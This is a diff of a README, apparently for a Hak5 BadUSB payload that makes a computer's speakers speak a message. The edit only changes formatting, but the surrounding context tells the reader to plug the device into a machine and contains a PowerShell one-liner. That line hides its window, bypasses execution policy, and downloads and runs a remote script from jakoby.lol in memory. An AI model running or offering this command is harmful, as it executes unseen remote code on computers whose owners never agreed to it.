@@ -1,3 +1,5 @@
+---
+---
 ![Logo](https://github.com/I-Am-Jakoby/hak5-submissions/blob/main/Assets/logo-170-px.png?raw=true)
 
 <!-- TABLE OF CONTENTS -->
@@ -39,9 +41,9 @@ SAPI speak with talk through their speakers the message provided or a custom one
 
 * Plug in your device
 * Invoke-WebRequest will be entered in the Run Box to download and execute the script from memory
-```
+<pre><code>
 powershell -w h -NoP -NonI -Ep Bypass irm jakoby.lol/yzb | iex
-```
+</code></pre>
 
 <p align="right">(<a href="#top">back to top</a>)</p>
 
